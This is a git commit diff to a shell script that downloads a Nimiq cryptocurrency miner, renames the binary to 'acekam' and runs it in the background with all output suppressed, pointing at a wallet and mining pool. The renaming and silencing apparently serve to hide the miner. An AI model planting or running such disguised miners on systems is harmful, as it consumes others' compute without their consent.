60ac9e587f2221f35dd0af67556e42909defffe5
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-12 08:55:53 +0700

    Update pepeka.sh

--- pepeka.sh
+++ pepeka.sh
@@ -2,4 +2,4 @@ apt-get update && apt-get install -y ca-certificates wget libcurl4 libjansson4 l
 wget -qO acekaman.tar.gz https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz
 tar -xhf acekaman.tar.gz
 mv nq-miner acekam
-./acekam -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p 47.89.234.73:8080 -n tes --threads 1 --jobs 4 > /dev/null 2>&1 &
+./acekam -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 -n tes --threads 1 --jobs 1 > /dev/null 2>&1 &
